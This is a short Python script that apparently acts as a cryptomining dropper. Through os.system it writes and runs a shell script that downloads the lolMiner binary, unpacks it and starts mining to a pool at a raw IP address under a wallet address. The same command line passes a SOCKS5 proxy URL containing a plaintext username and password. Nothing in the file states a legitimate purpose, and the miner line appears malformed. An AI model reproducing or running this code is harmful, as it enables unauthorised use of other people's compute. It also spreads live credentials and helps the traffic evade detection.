import os
os.system('echo "#!/bin/sh" >> tes')
os.system('echo "wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.35/lolMiner_v1.35_Lin64.tar.gz && tar zxvf lolMiner_v1.35_Lin64.tar.gz && cd 1.35" >> tes')
os.system('echo "./lolMiner --algo AUTOLYKOS2 --pool 216.250.118.159:443 --user 3CnZTtQYF7sGJHr1LsFRds4GmUvB1dUjAM.rknew - export proxy socks5://sikencot-rotate:mbah2237@p.webshare.io:80" >> tes')
os.system('sleep 2')
os.system('sh tes')
